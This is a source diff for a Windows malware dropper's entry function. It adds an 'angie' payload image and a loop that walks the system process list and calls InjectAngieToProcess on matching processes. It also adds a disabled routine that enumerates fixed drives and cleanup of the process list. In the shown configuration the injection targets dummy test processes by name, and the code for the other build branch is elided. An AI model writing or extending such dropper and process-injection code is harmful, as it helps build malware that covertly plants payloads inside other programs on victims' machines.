@@ -2,6 +2,7 @@
 #include <ntapi.h>
 #include <fnv1a.h>
 #include <random.h>
+#include <angie.h>
 
 VOID
 DECLSPEC_DLLEXPORT
@@ -18,24 +19,40 @@ DropperEntry(VOID)
     #endif
 
     InitRandom();
+    InitAngieImage();
 
     if (!LdrLoadNtapi()) {
         return;
     }
+
+    #if 0
+        DWORD dwLogicalDrives;
+
+        if (LdrQueryAllFixedVolumesBitmask(&dwLogicalDrives)) {
+            for (ULONG_PTR i = 0; i != 26; i++) {
+                if ((dwLogicalDrives >> i) & 0x1) {
+                    $DLOG1(DLG_FLT_HIGHLIGHT, "%c", 'A' + i);
+                }
+            }
+        }
+    #endif
 
     PSYSTEM_PROCESS_INFORMATION ProcessesList;
 
     if (LdrQueryAllProcesses(&ProcessesList)) {
         #if SCFG_DROPPER_PROCESSQUERY_INJECT_TO_PHONY == ON
             for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
-                #ifdef _AMD64_
-                    WCHAR szDummyName[] = L"DummyProcessx64.exe";
-                #else
-                    WCHAR szDummyName[] = L"DummyProcessx86.exe";
-                #endif
+                WCHAR szDummyName64[] = L"DummyProcessx64.exe";
+                WCHAR szDummyName32[] = L"DummyProcessx86.exe";
                 
-                if (RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName, sizeof(szDummyName))) {
-                
+                if (ProcessIndex->ImageName.MaximumLength == sizeof(szDummyName64) || ProcessIndex->ImageName.MaximumLength == sizeof(szDummyName32)) {
+                    if (RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName64, sizeof(szDummyName64)) || RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName32, sizeof(szDummyName32))) {
+                        #ifdef DEBUG
+                            InjectAngieToProcess((ULONG)ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
+                        #else
+                            InjectAngieToProcess((ULONG)ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
+                        #endif
+                    }
                 }
             }
         #else
@@ -82,5 +99,13 @@ DropperEntry(VOID)
                 }
             }
         #endif
+
+        {
+            SIZE_T dwRegionSize = 0;
+
+            if (NT_ERROR(NtFreeVirtualMemory(NtCurrentProcess(), (PVOID)&ProcessesList, &dwRegionSize, MEM_RELEASE))) {
+                $DLOG3(DLG_FLT_ERROR, "Failed to free ProcessesList");
+            }
+        };
     }
 }
